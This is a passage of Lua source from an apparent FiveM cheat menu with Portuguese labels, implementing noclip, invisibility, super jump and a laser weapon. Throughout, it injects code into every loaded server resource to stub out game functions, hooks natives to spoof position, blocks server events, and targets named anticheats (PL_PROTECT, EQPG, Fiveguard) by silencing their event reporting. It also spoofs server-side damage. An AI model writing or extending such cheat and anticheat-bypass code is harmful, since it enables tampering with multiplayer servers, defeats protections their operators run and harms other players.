                        SetEntityRotation(ped, camRot.x, 0.0, camRot.z, 2, true)
                    end
                end
                
            elseif modo == "Noclip Solo 1" then
                if next.values.checkbox["noclip"] then
                    NetworkStartSoloTutorialSession(0)
                end
                while next.values.checkbox["noclip"] do
                    Wait(0)
                    local ped = PlayerPedId()
                    local lastCoords = GetEntityCoords(ped)
                    SetEntityVisible(ped, true, true)
                    if not lastCoords then
                        lastCoords = GetEntityCoords(ped)
                    end
                    local camRot = GetFinalRenderedCamRot(2)
                    local forward = vector3(
                        -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x)),
                        math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x)),
                        math.sin(math.rad(camRot.x))
                    )
                    local right = vector3(
                        math.cos(math.rad(camRot.z)),
                        math.sin(math.rad(camRot.z)),
                        0.0
                    )
                    local speed = next.values.slider["nC_Speed"] + 0.0
                    if IsControlPressed(0, 21) then
                        speed = speed * 3.0
                    end
                    
                    if IsDisabledControlPressed(0, 32) then
                        lastCoords = lastCoords + forward * speed
                    end
                    if IsDisabledControlPressed(0, 33) then
                        lastCoords = lastCoords - forward * speed
                    end
                    if IsDisabledControlPressed(0, 30) then
                        lastCoords = lastCoords + right * speed
                    end
                    if IsDisabledControlPressed(0, 34) then
                        lastCoords = lastCoords - right * speed
                    end
                    if IsDisabledControlPressed(0, 22) then
                        lastCoords = lastCoords + vector3(0, 0, speed)
                    end
                    if IsDisabledControlPressed(0, 36) then
                        lastCoords = lastCoords - vector3(0, 0, speed)
                    end
                    
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        SetEntityCollision(veh, false, false)
                        FreezeEntityPosition(veh, true)
                        SetEntityCoordsNoOffset(veh, lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
                        SetEntityRotation(veh, camRot.x, 0.0, camRot.z, 2, true)
                        FreezeEntityPosition(veh, false)
                        SetEntityCollision(veh, true, true)
                    else
                        SetEntityCoordsNoOffset(ped, lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
                        SetEntityRotation(ped, camRot.x, 0.0, camRot.z, 2, true)
                    end
                end
                if not next.values.checkbox["noclip"] then
                    NetworkEndTutorialSession()
                end
                
elseif modo == "Noclip Solo 2" then
    local old_coords = GetEntityCoords(PlayerPedId())
    local old_heading = GetEntityHeading(PlayerPedId())

            for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
                FrameAPI.Inject(resourceName, [[
                Citizen.CreateThread(function()
                        SetEntityCoordsNoOffset = function() return true end
                        SetEntityCoords         = function() return true end
                        SetEntityRotation       = function() return true end
                        SetEntityHeading        = function() return true end
                        FreezeEntityPosition    = function() return true end
                        SetEntityCollision      = function() return true end
                        SetEntityVelocity       = function() return true end
                        SetEntityVisible        = function() return true end
                        SetEntityAlpha          = function() return true end
                        SetEntityInvincible     = function() return true end
                        SetPlayerInvincible     = function() return true end
                        SetPedCanRagdoll        = function() return true end
                        SetPedCanBeKnockedOffVehicle = function() return true end
                        SetEntityProofs         = function() return true end
                        ClonePed                = function() return 0 end
                        DeletePed               = function() return true end
                        DeleteEntity            = function() return true end
                        SetEntityAsMissionEntity= function() return true end
                        SetFocusEntity          = function() end
                        SetGameplayCamFollowPedThisUpdate = function() end
                        SetGameplayCamFollowEntityThisUpdate = function() end
                        SetFocusArea            = function() end
                        ClearFocus              = function() end
                        ClearPedTasksImmediately= function() end
                        ClearPedTasks           = function() end
                        ClearPedSecondaryTask   = function() end
                        TaskStandStill          = function() end
                        NetworkStartSoloTutorialSession = function() return true end
                        NetworkEndTutorialSession = function() return true end
                        RequestCollisionAtCoord = function() return true end
                        _G.SetEntityCoordsNoOffset = function() return true end
                        _G.SetEntityCoords      = function() return true end
                        _G.SetEntityRotation    = function() return true end
                        _G.SetEntityHeading     = function() return true end
                        _G.FreezeEntityPosition = function() return true end
                        _G.SetEntityCollision   = function() return true end
                        _G.SetEntityVelocity    = function() return true end
                        _G.SetEntityVisible     = function() return true end
                        _G.SetEntityInvincible  = function() return true end
                        _G.SetPlayerInvincible  = function() return true end
                        _G.ClonePed             = function() return 0 end
                        _G.DeletePed            = function() return true end
                        _G.DeleteEntity         = function() return true end
                        _G.SetEntityProofs      = function() return true end
                        GetEntityCoords         = function(ent)
                            if ent == PlayerPedId() then
                                return _G.__real_coords or vec3(0.0, 0.0, 0.0)
                            end
                            return _real.GetEntityCoords(ent)
                        end
                        GetEntityVelocity       = function() return vec3(0.0, 0.0, 0.0) end
                        GetEntitySpeed          = function() return 0.0 end
                        GetEntityHeightAboveGround = function() return 0.0 end
                        IsPedInAnyVehicle       = function() return false end
                        IsPedInVehicle          = function() return false end
                        IsEntityPositionFrozen  = function() return false end
                        IsEntityCollisionDisabled = function() return false end
                        IsEntityVisible         = function() return true end
                        IsEntityVisibleToScript = function() return true end
                        IsEntityInvincible      = function() return false end
                        IsPlayerInvincible      = function() return false end
                        IsEntityDead            = function() return false end
                        IsPlayerDead            = function() return false end
                        IsPedRagdoll            = function() return false end
                        GetPedInVehicleSeat     = function() return 0 end
                        GetVehiclePedIsIn       = function() return 0 end
                        IsVehicleSeatFree       = function() return true end
                        NetworkHasControlOfEntity = function() return true end
                        _G.GetEntityCoords      = GetEntityCoords
                        _G.GetEntityVelocity    = GetEntityVelocity
                        _G.GetEntitySpeed       = GetEntitySpeed
                        _G.IsPedInAnyVehicle    = function() return false end
                        _G.IsEntityPositionFrozen = function() return false end
                        _G.IsEntityCollisionDisabled = function() return false end
                        _G.IsEntityVisible      = function() return true end
                        _G.IsEntityInvincible   = function() return false end
                        _G.IsPlayerInvincible   = function() return false end
                        _G.IsEntityDead         = function() return false end
                        _G.GetPedInVehicleSeat  = function() return 0 end
                        _G.NetworkHasControlOfEntity = function() return true end
                end)
                ]])
            end
    
    if next.values.checkbox["noclip"] then
        local clone_ped = nil
        local solo_coords = {
            {x = 32.21, y = 7688.96, z = 3.44},
            {x = 4077.91, y = 4204.46, z = 15.64},
            {x = 2142.94, y = -2614.43, z = 10.89},
            {x = -3104.88, y = 3217.57, z = 2.13},
            {x = 3672.21, y = 3111.54, z = 2.66},
            {x = -2287.77, y = 2649.38, z = 1.23},
            {x = -1543.82, y = 3064.79, z = 37.11}
        }
        
        local function getRandomCoords()
            return solo_coords[math.random(1, #solo_coords)]
        end
        
        local function RotationToDirection(rot)
            local z = math.rad(rot.z)
            local x = math.rad(rot.x)
            local cosx = math.cos(x)
            return vector3(-math.sin(z) * cosx, math.cos(z) * cosx, math.sin(x))
        end
        
        local model = GetHashKey('mp_m_freemode_01')
        RequestModel(model)
        while not HasModelLoaded(model) do Wait(0) end
        
        clone_ped = ClonePed(PlayerPedId(), false, false, false)
        SetEntityCoords(clone_ped, old_coords)
        SetEntityHeading(clone_ped, old_heading)
        ClearPedTasksImmediately(clone_ped)
        TaskStandStill(PlayerPedId(), -1)
        
        SetFocusEntity(PlayerPedId())
        local p = getRandomCoords()
        SetEntityCoords(PlayerPedId(), p.x, p.y, p.z, true, true, true)
        SetFocusEntity(clone_ped)
        ClearPedSecondaryTask(PlayerPedId())
        
        while next.values.checkbox["noclip"] do
            Wait(0)
            FrameAPI.SyncCameraPosition(true, GetEntityCoords(clone_ped))
            next.functions['display_message']("Você está no Noclip Solo 2!", true)
            FreezeEntityPosition(PlayerPedId(), true)
            
            if not DoesEntityExist(clone_ped) then break end
            
            local noclip_speed = next.values.slider["nC_Speed"] + 0.0
            if IsControlPressed(0, 21) then
                noclip_speed = noclip_speed * 3.0
            end
            local ped = clone_ped
            local coords = GetEntityCoords(ped)
            
            RequestCollisionAtCoord(coords.x, coords.y, coords.z)
            SetFocusEntity(clone_ped)
            
            local rot = GetGameplayCamRot(0)
            local forward = RotationToDirection(rot)
            local right = vector3(forward.y, -forward.x, 0.0)
            
            if IsDisabledControlPressed(0, 32) then coords = coords + forward * noclip_speed end
            if IsDisabledControlPressed(0, 33) then coords = coords - forward * noclip_speed end
            if IsDisabledControlPressed(0, 35) then coords = coords + right * noclip_speed end
            if IsDisabledControlPressed(0, 34) then coords = coords - right * noclip_speed end
            if IsDisabledControlPressed(0, 22) then coords = vector3(coords.x, coords.y, coords.z + noclip_speed) end
            if IsDisabledControlPressed(0, 36) then coords = vector3(coords.x, coords.y, coords.z - noclip_speed) end
            
            SetEntityCollision(ped, false, false)
            SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, true, true, true)
            SetEntityRotation(ped, rot.x, rot.y, rot.z, 0, true)
            SetGameplayCamFollowPedThisUpdate(ped)
        end
        
        if clone_ped and DoesEntityExist(clone_ped) then
            FreezeEntityPosition(PlayerPedId(), false)
            local pos = GetEntityCoords(clone_ped)
            local hd = GetEntityHeading(clone_ped)
            SetEntityCoords(PlayerPedId(), pos.x, pos.y, pos.z, true, true, true)
            SetEntityHeading(PlayerPedId(), hd)
            SetEntityVisible(clone_ped, false, false)
            Wait(200)
            DeletePed(clone_ped)
            clone_ped = nil
        end
        
        FreezeEntityPosition(PlayerPedId(), false)
        ClearPedTasksImmediately(PlayerPedId())
        ClearFocus()
    end

elseif modo == "Noclip Invisibility" then
    FrameAPI.Scripting.HookNative(0x47D6F43D77935C75, true)
    FrameAPI.Scripting.HookNative(0xD796CB5BA8F20E32, true)
    FrameAPI.Scripting.HookNative(0xE659E47AF827484B, true)
    
    local ped = PlayerPedId()
    local lastCoords = GetEntityCoords(ped)
    SetEntityVisible(ped, false, false)
    
    while next.values.checkbox["noclip"] do
        Wait(0)
        ped = PlayerPedId()
        local noclipSpeed = next.values.slider["nC_Speed"] + 0.0
        
        if not lastCoords then
            lastCoords = GetEntityCoords(ped)
        end
        
        local speed = noclipSpeed
        if IsControlPressed(0, 21) then
            speed = speed * 3.0
        end
        
        local camRot = GetGameplayCamRot(0)
        local forward = vector3(
            -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x)),
            math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x)),
            math.sin(math.rad(camRot.x))
        )
        local right = vector3(
            math.cos(math.rad(camRot.z)),
            math.sin(math.rad(camRot.z)),
            0.0
        )
        
        if IsDisabledControlPressed(0, 32) then
            lastCoords = lastCoords + forward * speed
        end
        if IsDisabledControlPressed(0, 33) then
            lastCoords = lastCoords - forward * speed
        end
        if IsDisabledControlPressed(0, 30) then
            lastCoords = lastCoords + right * speed
        end
        if IsDisabledControlPressed(0, 34) then
            lastCoords = lastCoords - right * speed
        end
        if IsDisabledControlPressed(0, 22) then
            lastCoords = lastCoords + vector3(0, 0, speed)
        end
        if IsDisabledControlPressed(0, 36) then
            lastCoords = lastCoords - vector3(0, 0, speed)
        end
        
        if IsPedInAnyVehicle(ped) then
            local veh = GetVehiclePedIsIn(ped, false)
            SetEntityVisible(veh, false, false)
            SetEntityCoordsNoOffset(veh, lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
            SetEntityHeading(veh, camRot.z)
        else
            SetEntityCoordsNoOffset(ped, lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
            SetEntityHeading(ped, camRot.z)
        end
    end
    
    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
    SetEntityVisible(veh, true, true)
    SetEntityVisible(PlayerPedId(), true, true)
    
    FrameAPI.Scripting.RestoreNative(0x47D6F43D77935C75)
    FrameAPI.Scripting.RestoreNative(0xD796CB5BA8F20E32)
    FrameAPI.Scripting.RestoreNative(0xE659E47AF827484B)
end
            
            if not next.values.checkbox["noclip"] then
                FrameAPI.Scripting.RestoreNative(0x7DCE8BDA0F1C1200)
                FrameAPI.Scripting.RestoreNative(0x79CFD9827CC979B6)
                FrameAPI.Scripting.RestoreNative(0x94495889E22C6479)
                FrameAPI.Scripting.RestoreNative(0xCEDABC5900A0BF97)
                FrameAPI.Scripting.RestoreNative(0xFB92A102F1C4DFA3)
                FrameAPI.Scripting.RestoreNative(0x1DD55701034110E5)
                FrameAPI.Scripting.RestoreNative(0xA200EB1EE790F448)
                FrameAPI.Scripting.RestoreNative(0x14D6F5678D8F1B37)
                FrameAPI.Scripting.RestoreNative(0x5234F9F10919EABA)
                FrameAPI.Scripting.RestoreNative(0x580417101DDB492F)
                FrameAPI.Scripting.RestoreNative(0xDFB2B516207D3534)
                FrameAPI.Scripting.RestoreNative(0x39B5D1B10383F0C8)
                FrameAPI.Scripting.RestoreNative(0xEE778F8C7E1142E2)
                FrameAPI.Scripting.RestoreNative(0x8D4D46230B2C353A)
                FrameAPI.Scripting.RestoreNative(0xE659E47AF827484B)
                FrameAPI.Scripting.RestoreNative(0xB15162CB5826E9E8)
                FrameAPI.Scripting.RestoreNative(0xF5F1E89A970B7796)
                FrameAPI.Scripting.RestoreNative(0xC3330A45CCCDB26A)
                FrameAPI.Scripting.RestoreNative(0x65019750A0324133)
                FrameAPI.Scripting.RestoreNative(0x19CAFA3C87F7C2FF)
                FrameAPI.Scripting.RestoreNative(0xE31C2C72B8692B64)
                FrameAPI.Scripting.RestoreNative(0xD9D2CFFF49FAB35F)
                FrameAPI.SyncCameraPosition(false)
            end
        end)
    end
end)
end

next._noclip2ThreadRunning = next._noclip2ThreadRunning or false

if specialNoclipAC then
 next.elements.checkbox("Noclip", "noclip", function(bool)
    if bool then
        nt.createTh(function()
          FrameAPI['Scripting']['HookNative']("GetGroundZFor_3dCoord", c, false)
          FrameAPI['Scripting']['HookNative']("GetEntityCoords", c)
          FrameAPI['Scripting']['HookNative']("IsPedStill", 1.0)
          FrameAPI['Scripting']['HookNative']("GetEntityHeightAboveGround", 1.0)   
          FrameAPI['Scripting']['HookNative']("IsEntityInAir", false)
            FrameAPI['BlockClientEvent']('vRP:tunnel_req', true)
            if next.values.combobox['modoNc'] == "Solo Session" then
                for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
                    FrameAPI.Inject(resourceName, [[
                    Citizen.CreateThread(function()
                            SetEntityCoordsNoOffset = function() return true end
                            SetEntityCoords         = function() return true end
                            SetEntityRotation       = function() return true end
                            SetEntityHeading        = function() return true end
                            FreezeEntityPosition    = function() return true end
                            SetEntityCollision      = function() return true end
                            SetEntityVelocity       = function() return true end
                            SetEntityVisible        = function() return true end
                            SetEntityAlpha          = function() return true end
                            SetEntityInvincible     = function() return true end
                            SetPlayerInvincible     = function() return true end
                            SetPedCanRagdoll        = function() return true end
                            SetPedCanBeKnockedOffVehicle = function() return true end
                            SetEntityProofs         = function() return true end
                            ClonePed                = function() return 0 end
                            DeletePed               = function() return true end
                            DeleteEntity            = function() return true end
                            SetEntityAsMissionEntity= function() return true end
                            SetFocusEntity          = function() end
                            SetGameplayCamFollowPedThisUpdate = function() end
                            SetGameplayCamFollowEntityThisUpdate = function() end
                            SetFocusArea            = function() end
                            ClearFocus              = function() end
                            ClearPedTasksImmediately= function() end
                            ClearPedTasks           = function() end
                            ClearPedSecondaryTask   = function() end
                            TaskStandStill          = function() end
                            NetworkStartSoloTutorialSession = function() return true end
                            NetworkEndTutorialSession = function() return true end
                            RequestCollisionAtCoord = function() return true end
                            _G.SetEntityCoordsNoOffset = function() return true end
                            _G.SetEntityCoords      = function() return true end
                            _G.SetEntityRotation    = function() return true end
                            _G.SetEntityHeading     = function() return true end
                            _G.FreezeEntityPosition = function() return true end
                            _G.SetEntityCollision   = function() return true end
                            _G.SetEntityVelocity    = function() return true end
                            _G.SetEntityVisible     = function() return true end
                            _G.SetEntityInvincible  = function() return true end
                            _G.SetPlayerInvincible  = function() return true end
                            _G.ClonePed             = function() return 0 end
                            _G.DeletePed            = function() return true end
                            _G.DeleteEntity         = function() return true end
                            _G.SetEntityProofs      = function() return true end
                            GetEntityCoords         = function(ent)
                                if ent == PlayerPedId() then
                                    return _G.__real_coords or vec3(0.0, 0.0, 0.0)
                                end
                                return _real.GetEntityCoords(ent)
                            end
                            GetEntityVelocity       = function() return vec3(0.0, 0.0, 0.0) end
                            GetEntitySpeed          = function() return 0.0 end
                            GetEntityHeightAboveGround = function() return 0.0 end
                            IsPedInAnyVehicle       = function() return false end
                            IsPedInVehicle          = function() return false end
                            IsEntityPositionFrozen  = function() return false end
                            IsEntityCollisionDisabled = function() return false end
                            IsEntityVisible         = function() return true end
                            IsEntityVisibleToScript = function() return true end
                            IsEntityInvincible      = function() return false end
                            IsPlayerInvincible      = function() return false end
                            IsEntityDead            = function() return false end
                            IsPlayerDead            = function() return false end
                            IsPedRagdoll            = function() return false end
                            GetPedInVehicleSeat     = function() return 0 end
                            GetVehiclePedIsIn       = function() return 0 end
                            IsVehicleSeatFree       = function() return true end
                            NetworkHasControlOfEntity = function() return true end
                            _G.GetEntityCoords      = GetEntityCoords
                            _G.GetEntityVelocity    = GetEntityVelocity
                            _G.GetEntitySpeed       = GetEntitySpeed
                            _G.IsPedInAnyVehicle    = function() return false end
                            _G.IsEntityPositionFrozen = function() return false end
                            _G.IsEntityCollisionDisabled = function() return false end
                            _G.IsEntityVisible      = function() return true end
                            _G.IsEntityInvincible   = function() return false end
                            _G.IsPlayerInvincible   = function() return false end
                            _G.IsEntityDead         = function() return false end
                            _G.GetPedInVehicleSeat  = function() return 0 end
                            _G.NetworkHasControlOfEntity = function() return true end
                            TaskParachute = function() return false end
                    end)
                    ]])
                end
                local modelHash = GetHashKey('mp_m_freemode_01')
                while not HasModelLoaded(modelHash) do
                    RequestModel(modelHash)
                    Wait(10)
                end
                local coords = GetEntityCoords(PlayerPedId())
                desyncPed = ClonePed(PlayerPedId(), false, false, false)
                SetEntityCoords(desyncPed, coords)
                if IsEntityAttached(PlayerPedId()) then
                    DetachEntity(PlayerPedId(), true, false)
                    local entity = GetEntityAttachedTo(PlayerPedId())
                    DeletePed(entity)
                end
                
                SetCanAttackFriendly(desyncPed, true, false)
                SetFocusEntity(desyncPed)
                SetEntityAsMissionEntity(desyncPed)
                SetPedAlertness(desyncPed, 0.0)
                SetGameplayCamFollowPedThisUpdate(desyncPed)
                ClearPedTasks(desyncPed)
                ClearPedSecondaryTask(desyncPed)
                SetPedKeepTask(desyncPed, false)
                FreezeEntityPosition(PlayerPedId(), true)
                RequestCollisionAtCoord(GetEntityCoords(desyncPed))
                SetHdArea(GetEntityCoords(desyncPed), 50.0)
                SetEntityInvincible(desyncPed, true)
                FreezeEntityPosition(PlayerPedId(), true)
                
                while next.values.checkbox["noclip"] do
                    next.functions['display_message']("Você está com o Solo Session ativo!", true)

                    SetEntityCoords(PlayerPedId(), 9396.0, -6741.0, -107.0, false, false, false, false)
                    if not DoesEntityExist(desyncPed) then
                        next.values.checkbox["noclip"] = false
                        break
                    end
                    
                    SetEntityOnlyDamagedByRelationshipGroup(PlayerPedId(), true)
                    SetGameplayCamFollowPedThisUpdate(desyncPed)
                    
                    local vehicle = GetVehiclePedIsUsing(desyncPed)
                    
                    if vehicle then
                        SetPedKeepTask(desyncPed, false)
                        ClearVehicleTasks(vehicle)
                    end
                    
                    TaskStandStill(PlayerPedId(), 10)
                    SetPedKeepTask(desyncPed, false)
                    
                    local coords = GetEntityCoords(desyncPed)
                    local _coords = coords
                    local sprint = false

                    FrameAPI.SyncCameraPosition(true, vector3(coords.x, coords.y, coords.z))
                    
                    if IsDisabledControlPressed(0, 21) then
                        TaskStandStill(PlayerPedId(), 10)
                        sprint = true
                    end
                
                    local player_coords = GetEntityCoords(desyncPed)
                    local player_cam_rot = GetGameplayCamRot(0)
                    local forward, right = GetEntityMatrix(desyncPed)
                    
                    local is_in_vehicle = IsPedInAnyVehicle(desyncPed, false)
                    local entity = is_in_vehicle and GetVehiclePedIsIn(desyncPed, false) or desyncPed
                    
                    local noclip_speed = next.values.slider["nC_Speed"] + 0.0
                    if IsControlPressed(0, 21) then
                        noclip_speed = noclip_speed * 3.0
                    end
                    
                    if IsDisabledControlPressed(0, 32) then 
                        player_coords = player_coords + forward * noclip_speed
                    end
                    if IsDisabledControlPressed(0, 33) then 
                        player_coords = player_coords + forward * -noclip_speed
                    end
                    if IsDisabledControlPressed(0, 30) then 
                        player_coords = player_coords + right * noclip_speed
                    end
                    if IsDisabledControlPressed(0, 34) then 
                        player_coords = player_coords + right * -noclip_speed
                    end            
                    
                    FreezeEntityPosition(entity, true)
                    FreezeEntityPosition(PlayerPedId(), true)
                    SetEntityCoordsNoOffset(entity, player_coords.x, player_coords.y, player_coords.z, true, true, true)
                    SetEntityRotation(entity, player_cam_rot.x, player_cam_rot.y, player_cam_rot.z, 0, true)
                    
                    if IsDisabledControlJustPressed(0, 321) and not IsPedJumping(desyncPed) then
                        NetworkRequestControlOfEntity(desyncPed)
                        SetEntityAsMissionEntity(desyncPed)
                        TaskJump(desyncPed, true)
                    end
                
                    if IsDisabledControlPressed(0, 321) then
                        NetworkRequestControlOfEntity(desyncPed)
                        SetEntityAsMissionEntity(desyncPed)
                        TaskJump(desyncPed, true)
                    end
                    
                    Wait(1)
                end
                
                if not next.values.checkbox["noclip"] then
                    local lastCoords = GetEntityCoords(desyncPed)
                    FrameAPI.SyncCameraPosition(false)
                    SetEntityCoordsNoOffset(PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
                    DeletePed(desyncPed)
                    FreezeEntityPosition(PlayerPedId(), false)
                end
            else
                while next.values.checkbox["noclip"] do

                    if next.values.combobox['modoNc'] == "Invisivel" then
                        SetEntityVisible(PlayerPedId(), false)
                    end

                    if group == "Lotus Group" then
                        FrameAPI.BlockClientEvent("vRP:tunnel_req", true)
                    end

                    if anticheat == "MQCU" then
                        TaskParachute(PlayerPedId())
                    end

                    if GetResourceState("eqpg-library") == "started" then
                        nt.createTh(function()
                            while true do
                                Wait(0)
                                next.Coords = GetEntityCoords(PlayerPedId())
                            end
                        end)
                        FrameAPI.Scripting.HookNative(0xA200EB1EE790F448, next.Coords)
                        FrameAPI.Scripting.HookNative(0x14D6F5678D8F1B37, next.Coords)
                        FrameAPI.Scripting.HookNative(0x5234F9F10919EABA, -1)
                        FrameAPI.Scripting.HookNative(0x580417101DDB492F, false)
                        FrameAPI.Scripting.HookNative(0xDFB2B516207D3534, false)
                        FrameAPI.Scripting.HookNative(0x39B5D1B10383F0C8, true)
                        FrameAPI.Scripting.HookNative(0xEE778F8C7E1142E2, 1)
                        FrameAPI.Scripting.HookNative(0x8D4D46230B2C353A, 4)
                        FrameAPI.Scripting.HookNative(0xE659E47AF827484B, true)
                        FrameAPI.Scripting.HookNative(0xB15162CB5826E9E8, true)
                        FrameAPI.Scripting.HookNative(0xF5F1E89A970B7796, true)
                        FrameAPI.Scripting.HookNative(0xC3330A45CCCDB26A, 50.0)
                        FrameAPI.Scripting.HookNative(0x65019750A0324133, 50.0)
                        FrameAPI.Scripting.HookNative(0x7DCE8BDA0F1C1200, true)
                        FrameAPI.Scripting.HookNative(0x79CFD9827CC979B6, 2)
                        FrameAPI.Scripting.HookNative(0x94495889E22C6479, true)
                    end

                    if anticheat == "PL_PROTECT" then
                        if noclipActive and not lastNoclipState then
                            FrameAPI.Inject('PL_PROTECT', [[
                                if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                                    _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
                                end
                                TriggerServerEvent = function(eventName, ...)
                                    return
                                end
                                if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                                    _G._ORIGINAL_TRIGGER_SERVER_EVENT = __plTriggerServerEventpldfsd
                                end
                                __plTriggerServerEventpldfsd = function(eventName, ...)
                                    return
                                end
                            ]])
                        elseif not noclipActive and lastNoclipState then
                            FrameAPI.Inject('PL_PROTECT', [[
                                if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                                    __plTriggerServerEventpldfsd = _G._ORIGINAL_TRIGGER_SERVER_EVENT
                                    _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
                                end
                            ]])
                        end
                    end

                    Wait(15)
                    
                    local ped = PlayerPedId()
                    local vehicle = IsPedInAnyVehicle(ped, false)
                    local entity = vehicle and GetVehiclePedIsIn(ped, false) or ped
                    
                    DisablePedPainAudio(ped, true)
                    NetworkSetEntityCanBlend(ped, false)
                    
                    local x, y, z = table.unpack(GetEntityCoords(entity, true))
                    local heading = GetEntityHeading(entity)
                    
                    local speed = next.values.slider["nC_Speed"] + 0.0
                    if IsControlPressed(0, 21) then
                        speed = speed * 3.0
                    end

                    local pitch = GetGameplayCamRelativePitch()
                    local camHeading = GetGameplayCamRelativeHeading() + GetEntityHeading(ped)
                    
                    local dx = -math.sin(camHeading * math.pi / 180)
                    local dy = math.cos(camHeading * math.pi / 180)
                    local dz = math.sin(pitch * math.pi / 180)
                    
                    local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                    if len ~= 0 then
                        dx = dx / len
                        dy = dy / len
                        dz = dz / len
                    end
                    
                    if IsControlPressed(0, 21) then
                        speed = speed * 2
                    end
                    
                    if IsControlPressed(0, 32) then
                        x = x + speed * dx
                        y = y + speed * dy
                        z = z + speed * dz
                    end
                    
                    if IsControlPressed(0, 33) then
                        x = x - speed * dx
                        y = y - speed * dy
                        z = z - speed * dz
                    end
                    
                    if IsControlPressed(0, 34) then
                        local leftVector = vector3(-dy, dx, 0.0)
                        x = x + speed * leftVector.x
                        y = y + speed * leftVector.y
                    end
                    
                    if IsControlPressed(0, 35) then
                        local rightVector = vector3(dy, -dx, 0.0)
                        x = x + speed * rightVector.x
                        y = y + speed * rightVector.y
                    end
                    
                    if IsControlPressed(0, 22) then
                        z = z + speed
                    end
                    
                    if IsControlPressed(0, 36) then
                        z = z - speed
                    end
                    
                    local gameplayCamRot = GetGameplayCamRot(0)
                    
                    SetEntityHeading(ped, camHeading)
                    SetEntityHeading(entity, camHeading)
                    
                    SetEntityCoordsNoOffset(entity, x, y, z, true, true, true)
                    FreezeEntityPosition(entity, false)
                    
                    SetPedMaxMoveBlendRatio(ped, 1.0)
                end

                if next.values.combobox['modoNc'] == "Invisivel" then
                    SetEntityVisible(PlayerPedId(), true)
                end

                SetEntityVisible(ped, true, false)
                if vehicle then
                    SetEntityVisible(GetVehiclePedIsIn(ped, false), true, false)
                end
                
                FreezeEntityPosition(entity, false)
                
                if group == "Lotus Group" then
                    FrameAPI.BlockClientEvent("vRP:tunnel_req", false)
                end

                if GetResourceState("eqpg-library") == "started" then
                    FrameAPI.Scripting.RestoreNative(0xA200EB1EE790F448)
                    FrameAPI.Scripting.RestoreNative(0x14D6F5678D8F1B37)
                    FrameAPI.Scripting.RestoreNative(0x5234F9F10919EABA)
                    FrameAPI.Scripting.RestoreNative(0x580417101DDB492F)
                    FrameAPI.Scripting.RestoreNative(0xDFB2B516207D3534)
                    FrameAPI.Scripting.RestoreNative(0x39B5D1B10383F0C8)
                    FrameAPI.Scripting.RestoreNative(0xEE778F8C7E1142E2)
                    FrameAPI.Scripting.RestoreNative(0x8D4D46230B2C353A)
                    FrameAPI.Scripting.RestoreNative(0xE659E47AF827484B)
                    FrameAPI.Scripting.RestoreNative(0xB15162CB5826E9E8)
                    FrameAPI.Scripting.RestoreNative(0xF5F1E89A970B7796)
                    FrameAPI.Scripting.RestoreNative(0xC3330A45CCCDB26A)
                    FrameAPI.Scripting.RestoreNative(0x65019750A0324133)
                    FrameAPI.Scripting.RestoreNative(0x7DCE8BDA0F1C1200)
                    FrameAPI.Scripting.RestoreNative(0x79CFD9827CC979B6)
                    FrameAPI.Scripting.RestoreNative(0x94495889E22C6479)
                end

                if anticheat == "PL_PROTECT" then
                    FrameAPI.Inject('PL_PROTECT', [[
                        if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                            TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
                            _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
                        end
                    ]])
                end
            end
        end)
    end
end)        
end

next.elements.slider("Velocidade NoClip", "nC_Speed", {min = 0, max = 25, start = 1}, function(value)
end)

if anticheat ~= "Fiveguard" or anticheat ~= "EQPG" then
                    next.elements.checkbox("Invisibilidade", "invisivel", function(bool)
                        if next.values.checkbox["invisivel"] then
                            if anticheat == 'PL_PROTECT' then
                                local code = [[
                                    _G.IsEntityVisible = function()
                                        return false
                                    end
                                ]]
                                FrameAPI.Inject('PL_PROTECT', code)
                            end
                            SetEntityVisible(PlayerPedId(), false, false)
                        else
                            SetEntityVisible(PlayerPedId(), true, true)
                        end
                    end)
                end
next.elements.checkbox("Super Pulo", "bunnymode", function(bool)
    FrameAPI.Scripting.HookNative('IsPedDoingBeastJump', false)

    if bool then
        Citizen.CreateThread(function()
            while next.values.checkbox["bunnymode"] do
                Wait(0)

                SetSuperJumpThisFrame(PlayerId())
                SetBeastModeActive(PlayerId(), true)
            end

            SetBeastModeActive(PlayerId(), false)
        end)
    else
        SetBeastModeActive(PlayerId(), false)
    end
end)
    if anticheat == "Fiveguard" or group == "Santa Group" or anticheat == "ThnAC" then
   next.elements.checkbox("Olhos Lazer", "superlazer", function(state)
        local weaponHash = GetHashKey("weapon_raycarbine")
        if not HasWeaponAssetLoaded(weaponHash) then
            RequestWeaponAsset(weaponHash, 31, 0)
            while not HasWeaponAssetLoaded(weaponHash) do
                Citizen.Wait(0)
            end
        end
     nt.createTh(function()
        FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_HEN"))
        next.bypass['weapon'](true)
        FrameAPI.Scripting.HookNative('ShootSingleBulletBetweenCoords', false)
        while next.values.checkbox["superlazer"] do
            Citizen.Wait(0)
            if IsControlPressed(0, 38) then
                local ped = PlayerPedId()
                local hit, endCoords = next.functions.camFreeCast(50000.0)
                if hit then
                    local Olho1 = GetPedBoneCoords(ped, 31086, -0.03, 0.15, 0.0)
                    local Olho2 = GetPedBoneCoords(ped, 31086, 0.03, 0.15, 0.0)
